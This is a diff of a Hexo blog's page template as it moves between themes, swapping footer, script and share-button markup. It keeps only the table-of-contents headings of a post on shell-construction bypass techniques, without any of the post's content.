class="nav-number">2.1.</span> <span class="nav-text">shell方面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或构造"><span class="nav-number">2.1.1.</span> <span class="nav-text">异或构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#取反构造"><span class="nav-number">2.1.2.</span> <span class="nav-text">取反构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#只用数字构造"><span class="nav-number">2.1.3.</span> <span class="nav-text">只用数字构造</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不可见字符"><span class="nav-number">2.1.4.</span> <span class="nav-text">不可见字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#glob通配符"><span class="nav-number">2.1.5.</span> <span class="nav-text">glob通配符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#进制转换构造"><span class="nav-number">2.1.6.</span> <span class="nav-text">进制转换构造</span></a></li></ol></li></ol></li></ol></div>
             
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
 
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
-      
-
+        
+        
+            
+        
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2020 John Doe. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/20/hacker101/"
+                    data-tooltip="hacker101"
+                    aria-label="上一篇: hacker101"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/19/commix-testbed/"
+                    data-tooltip="commix-testbed"
+                    aria-label="下一篇: commix-testbed"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/极限利用/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
 </div>
 
 
-<div class="powered-by">
-  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
-</div>
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/19/极限利用/"
+                        aria-label="分享到 Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/19/极限利用/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/19/极限利用/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
 
-<div class="theme-info">
-  Theme -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
-  </a>
-</div>
 
-
+            
+        </div>
         
 
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
         
-      </div>
-    </footer>
+            <h4 id="about-card-name">John Doe</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
+<!--SCRIPTS END-->
+
 
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
-  </div>
 
-  
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
 
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
